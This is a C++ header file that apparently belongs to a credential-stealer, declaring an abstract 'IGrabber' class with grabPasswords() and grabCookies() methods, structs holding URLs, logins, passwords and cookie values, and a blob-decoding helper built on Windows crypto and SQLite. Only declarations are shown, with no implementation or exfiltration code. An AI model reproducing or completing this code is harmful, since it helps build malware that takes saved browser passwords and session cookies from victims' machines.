#ifndef GRABBER_H
#define GRABBER_H
#include <windows.h>
#include <Wincrypt.h>
#include "sqlite3.h"
#include <string>
#include <vector>
using namespace std;

class IGrabber {
public:
	struct Cookie {
		wstring url, name, value;
		Cookie(wstring ur, wstring nm, wstring val) {
			url = ur;
			name = nm;
			value = val;
		}
	};

	struct Profile {
		wstring url, login, pass;
		Profile(const wstring& ur, const wstring& log, const wstring& ps) {
			url = ur;
			login = log;
			pass = ps;
		}
	};

	virtual vector <Profile> grabPasswords() = 0;
	virtual vector <Cookie> grabCookies() = 0;
protected:
	const wchar_t *fromCharToWChar(const char *c);
	const char * decodeBlob(const char *blob, int size);
};
#endif